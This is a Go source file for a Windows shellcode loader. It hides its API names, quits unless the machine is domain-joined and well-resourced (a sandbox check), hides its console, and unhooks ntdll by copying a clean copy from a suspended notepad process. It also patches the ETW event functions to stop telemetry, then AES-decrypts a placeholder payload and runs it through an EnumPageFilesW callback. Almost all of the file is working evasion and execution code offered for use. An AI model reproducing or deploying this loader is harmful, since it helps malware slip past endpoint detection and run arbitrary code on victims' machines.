package main

import (
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"runtime"
)

var modntdll = windows.NewLazySystemDLL("ntdll.dll")
var funcNtReadVirtualMemory = modntdll.NewProc("NtReadVirtualMemory")

var modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
var procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
var procReadProcessMemory = modkernel32.NewProc("ReadProcessMemory")

var funcNtWriteVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
var funcNtProtectVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))

var procEtwNotificationRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'N', 'o', 't', 'i', 'f', 'i', 'c', 'a', 't', 'i', 'o', 'n', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r'}))
var procEtwEventRegister = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r'}))
var procEtwEventWriteFull = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 'F', 'u', 'l', 'l'}))
var procEtwEventWrite = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e'}))

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

const (
	errnoERROR_IO_PENDING = 997
)

var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
	Ntdllbytes          []byte
	ntdlloffset         uint
	ntdllsize           uint
)

func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	return e
}

func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

func Console(show bool) {
	getWin := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetConsoleWindow")
	showWin := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2'})).NewProc("ShowWindow")
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
		return
	}
	if show {
		var SW_RESTORE uintptr = 9
		showWin.Call(hwnd, SW_RESTORE)
	} else {
		var SW_HIDE uintptr = 0
		showWin.Call(hwnd, SW_HIDE)
	}
}

func CreateProcess() *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	Target := "C:\\Windows\\System32\\notepad.exe"
	commandLine, err := syscall.UTF16PtrFromString(Target)

	if err != nil {
		panic(err)
	}
	var startupInfo StartupInfoEx
	si.Cb = uint32(unsafe.Sizeof(startupInfo))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE

	err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		uint32(windows.CREATE_SUSPENDED),
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

func readProcessMemory(procHandle windows.Handle, address uint64, size uint) []byte {
	var read uint

	buffer := make([]byte, size)

	ret, _, _ := funcNtReadVirtualMemory.Call(
		uintptr(procHandle),
		uintptr(address),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&read)),
	)
	if int(ret) >= 0 && read > 0 {
		return buffer[:read]
	}
	return nil

}

type MEMORYSTATUSEX struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

func Check() {
	Domaincheck, _ := DomainJoinedCheck()
	if Domaincheck == false {
		os.Exit(3)
	}
	RAMCheck := RAMCheckSize(4)
	if RAMCheck == false {
		os.Exit(3)
	}
	CPUcheck := CPU(2)
	if CPUcheck == false {
		os.Exit(3)
	}
}

func DomainJoinedCheck() (bool, error) {
	var domain *uint16
	var status uint32
	err := syscall.NetGetJoinInformation(nil, &domain, &status)
	if err != nil {
		return false, err
	}
	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(domain)))
	return status == syscall.NetSetupDomainName, nil
}

func CPU(minCheck int64) bool {
	num_procs := runtime.NumCPU()
	minimum_processors_required := int(minCheck)
	if num_procs >= minimum_processors_required {
		return true
	}
	return false
}

func RAMCheckSize(num uint64) bool {
	var memInfo MEMORYSTATUSEX
	kernel32 := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'}))
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	memInfo.dwLength = uint32(unsafe.Sizeof(memInfo))
	globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if memInfo.ullTotalPhys/1073741824 > num {
		return true
	}
	return false
}

func ETW(handlez windows.Handle) {
	dataAddr := []uintptr{procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWrite.Addr()}
	for i, _ := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		WriteProcessMemory(handlez, dataAddr[i], uintptr(unsafe.Pointer(&data[0])), uintptr(uint32(datalength)), &nLength)
	}
}

func main() {

	Check()
	Console(false)
	processID := uint32(os.Getpid())
	processHandle, _ := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))

	pi := CreateProcess()

	time.Sleep(5 * time.Second)
	hh, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
	if err != nil {
	}

	if hh != 0 {

	} else {
		os.Exit(1)
	}

	Ntdllbytes, ntdllsize, ntdlloffset = ReadRemoteProcess("C:\\Windows\\System32\\ntdll.dll", hh)

	magic("ntdll.dll", Ntdllbytes, ntdlloffset, ntdllsize, processHandle)

	stringpid := int(pi.ProcessId)
	p, _ := os.FindProcess(stringpid)
	p.Kill()

	ETW(processHandle)

	Shellcode()
}

func ReadRemoteProcess(name string, handle windows.Handle) ([]byte, uint, uint) {
	file, error := pe.Open(name)
	if error != nil {
	}
	x := file.Section(".text")
	size := x.Size
	loaddll, error := windows.LoadDLL(name)
	if error != nil {
	}
	ddhandlez := loaddll.Handle
	dllBase := uintptr(ddhandlez)
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)

	rawr, err := ReadProcessMemoryy(handle, uintptr(dllOffset), uintptr(size))
	if err != nil {
		fmt.Println(err)
	}
	return rawr, uint(size), dllOffset
}

func magic(name string, bytes []byte, addr uint, size uint, handlez windows.Handle) {
	var nLength uintptr
	test := WriteProcessMemory(handlez, uintptr(addr), uintptr(unsafe.Pointer(&bytes[0])), uintptr(uint32(len(bytes))), &nLength)
	if test != nil {
		fmt.Println(test)
	} else {

	}
}
func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func ReadProcessMemoryy(hProcess windows.Handle, lpBaseAddress uintptr, nSize uintptr) (data []byte, err error) {
	data = make([]byte, nSize)
	var nbr uintptr = 00
	ret, _, err := syscall.Syscall6(procReadProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(&data[0])), nSize, uintptr(unsafe.Pointer(&nbr)), 0)
	if ret == 0 {
		return nil, err
	}

	return data, nil
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding := int(src[length-1])
	return src[:(length - unpadding)]
}

func Shellcode() {

	//encrypted shellcode
	vciphertext, _ := base64.StdEncoding.DecodeString("00000000000000000000000000000000000000000000000000000000000")

	vkey, _ := base64.StdEncoding.DecodeString("YparT5vKM2S9IKDQ9CC8W1zAaPzSIjYjUtmsbXBEPKM=")
	viv, _ := base64.StdEncoding.DecodeString("YsHlT1/wOmegy5LpM4MqoQ==")

	block, _ := aes.NewCipher(vkey)

	decrypted := make([]byte, len(vciphertext))
	mode := cipher.NewCBCDecrypter(block, viv)
	mode.CryptBlocks(decrypted, vciphertext)
	stuff := PKCS5UnPadding(decrypted)

	rawdata := (string(stuff))
	hexdata, _ := base64.StdEncoding.DecodeString(rawdata)
	shellcode, _ := hex.DecodeString(string(hexdata))
	var lpBaseAddress uintptr
	size := len(shellcode)

	oldProtect := windows.PAGE_READWRITE

	funcNtAllocateVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&lpBaseAddress)), 0, uintptr(unsafe.Pointer(&size)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	funcNtWriteVirtualMemory.Call(uintptr(0xffffffffffffffff), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), 0)

	funcNtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&lpBaseAddress)), uintptr(unsafe.Pointer(&size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	psapi := windows.NewLazySystemDLL("psapi.dll")
	EnumPageFilesW := psapi.NewProc("EnumPageFilesW")
	EnumPageFilesW.Call(lpBaseAddress, 0)

}
